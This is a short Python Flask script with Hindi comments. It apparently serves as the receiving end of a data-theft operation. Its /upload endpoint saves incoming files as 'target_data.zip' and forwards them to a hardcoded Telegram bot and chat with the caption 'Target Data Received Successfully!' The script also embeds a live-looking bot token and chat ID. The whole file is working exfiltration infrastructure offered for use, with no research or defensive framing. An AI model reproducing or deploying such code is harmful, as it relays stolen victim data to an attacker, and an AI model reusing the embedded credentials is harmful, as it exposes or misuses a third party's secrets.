import os
from flask import Flask, request
import requests

app = Flask(__name__)

# तुम्हारे कन्फर्म और सही टेलीग्राम क्रेडेंशियल्स
TELEGRAM_BOT_TOKEN = "9238477846:AAGt_tkK8EmI7W5UYMh_PrkjCKwUYGzijnQ"
TELEGRAM_CHAT_ID = "6698661771"

@app.route('/upload', methods=['POST'])
def receive_data():
    if 'file' not in request.files:
        return "No file found", 400
    
    file = request.files['file']
    file_path = "/tmp/target_data.zip"
    file.save(file_path)

    # टेलीग्राम बॉट पर ज़िप फाइल भेजने की सेफ रिक्वेस्ट
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, 'rb') as f:
        response = requests.post(
            url, 
            data={'chat_id': TELEGRAM_CHAT_ID, 'caption': '🎯 Target Data Received Successfully!'}, 
            files={'document': f}
        )
    
    return "Success", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
  
